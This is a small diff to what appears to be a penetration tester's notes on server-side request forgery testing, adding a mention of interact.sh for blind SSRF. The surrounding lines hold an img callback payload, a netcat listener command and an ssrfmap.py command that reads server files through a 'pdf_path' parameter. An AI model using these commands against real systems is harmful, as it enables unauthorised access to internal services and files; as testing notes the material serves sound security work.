@@ -88,6 +88,8 @@ SSRF (without burp professional)
 <img src="http://end:porta">
 nc -nlvp 31337
 
+interact.sh-> blind
+
 PoC
 python3 ssrfmap.py -r /home/pen/request.txt -m readfiles -p "pdf_path="
 
